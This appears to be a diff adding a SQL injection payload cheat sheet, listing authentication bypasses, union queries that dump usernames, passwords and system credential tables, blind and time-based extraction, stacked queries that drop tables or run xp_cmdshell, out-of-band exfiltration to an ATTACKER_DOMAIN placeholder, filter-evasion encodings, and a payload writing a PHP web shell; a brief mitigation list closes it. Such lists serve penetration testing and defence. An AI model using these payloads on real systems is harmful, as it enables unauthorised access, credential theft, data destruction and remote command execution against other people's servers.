@@ -1,0 +1,79 @@
+SQL Injection (SQLi) Payloads:
+
+### Authentication Bypass:
+- ' OR 1=1 --
+- ' OR 'a'='a --
+- ' OR 1=1 LIMIT 1 --
+- admin' --
+- ' OR ''='
+- ' OR '1'='1' --
+
+### Union-Based Injection:
+- ' UNION SELECT NULL,NULL --
+- ' UNION SELECT username,password FROM users --
+- ' UNION SELECT table_name FROM information_schema.tables --
+- ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+- ' UNION SELECT database() --
+- ' UNION SELECT @@version --
+- ' UNION SELECT LOAD_FILE('/etc/passwd') --
+
+### Blind (Boolean-Based):
+- ' AND 1=1 --
+- ' AND 1=2 --
+- ' AND (SELECT COUNT(*) FROM users) > 0 --
+- ' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64 --
+
+### Blind (Time-Based):
+- ' AND SLEEP(5) --
+- ' AND IF(1=1, SLEEP(5), 0) --
+- ' AND (SELECT COUNT(*) FROM information_schema.tables) AND SLEEP(5) --
+
+### Error-Based Injection:
+- ' AND extractvalue(1, concat(0x7e, database())) --
+- ' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1) --
+- ' AND 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1) as int) --
+
+### Stacked Queries:
+- '; DROP TABLE users --
+- '; EXEC xp_cmdshell('net user') -- (MSSQL)
+- '; SELECT * FROM users; --
+
+### Out-of-Band (OOB):
+- ' UNION SELECT LOAD_FILE(concat('\\\\', (SELECT database()), '.ATTACKER_DOMAIN\\abc')) --
+- ' AND 1=0 UNION SELECT extractvalue(1,concat(0x7e,(select LOAD_FILE(concat('\\\\',(database()),'.ATTACKER_DOMAIN\\abc'))),0x7e)) --
+
+### Comment Styles:
+- -- (double dash)
+- # (hash)
+- /* */ (block comment)
+
+### Bypass Techniques:
+- Case variation: ' Or 1=1 --
+- Inline comments: ' /*!UNION*/ /*!SELECT*/ --
+- Hex encoding: 0x27554e494f4e2053454c45435420
+- URL encoding: %27%20OR%201%3D1%20--
+- Space replacement: ' OR/**/1=1 --
+- Keyword replacement: ' UNIunionON SELselectECT --
+
+### Database-Specific:
+- MySQL: ' UNION SELECT user,password FROM mysql.user --
+- PostgreSQL: ' UNION SELECT usename,passwd FROM pg_shadow --
+- MSSQL: ' UNION SELECT name FROM sys.databases --
+- Oracle: ' UNION SELECT table_name FROM all_tables --
+
+### Advanced Payloads:
+- ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php' --
+- ' AND 1=0 UNION SELECT password FROM users INTO OUTFILE '/tmp/passwd' --
+- Time-based data exfiltration: ' AND IF(ASCII(SUBSTRING(password,1,1))=97, SLEEP(5), 0) --
+
+### Detection and Testing:
+- Test with: ' OR '1'='1
+- Check for SQL errors or unexpected behavior
+- Use tools like sqlmap for automation
+
+### Mitigation Notes:
+- Use prepared statements and parameterized queries
+- Implement input validation and sanitization
+- Escape special characters
+- Use ORM libraries
+- Limit database permissions
